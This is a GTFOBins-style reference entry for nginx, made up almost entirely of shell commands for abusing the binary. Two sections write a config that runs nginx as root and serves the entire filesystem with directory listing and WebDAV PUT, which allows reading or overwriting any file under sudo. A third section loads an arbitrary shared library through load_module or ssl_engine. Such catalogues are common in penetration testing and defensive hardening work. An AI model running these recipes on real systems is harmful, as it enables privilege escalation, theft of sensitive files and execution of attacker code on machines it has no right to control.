---
type: gtfobin
name: nginx
platform: Unix
functions: [download, library-load, upload]
tags: [gtfobin, unix, lotl]
---

# nginx

## download

```bash
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```
**Contexts:** sudo

## library-load

```bash
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file
```
_Alternatively, the `ssl_engine` directive can be used._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```
**Contexts:** sudo
